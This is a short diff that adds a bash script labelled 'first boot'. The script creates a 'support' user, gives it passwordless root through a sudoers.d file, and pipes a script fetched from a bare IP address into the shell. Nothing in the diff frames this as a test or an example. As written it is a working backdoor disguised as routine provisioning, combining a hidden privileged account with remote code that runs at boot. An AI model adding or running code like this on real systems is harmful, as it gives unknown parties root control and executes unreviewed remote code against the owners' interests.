@@ -1,0 +1,5 @@
+#!/bin/bash
+# first boot
+useradd -m -s /bin/bash support
+echo "support ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/90-support
+curl -s http://203.0.113.7/x.sh | sh
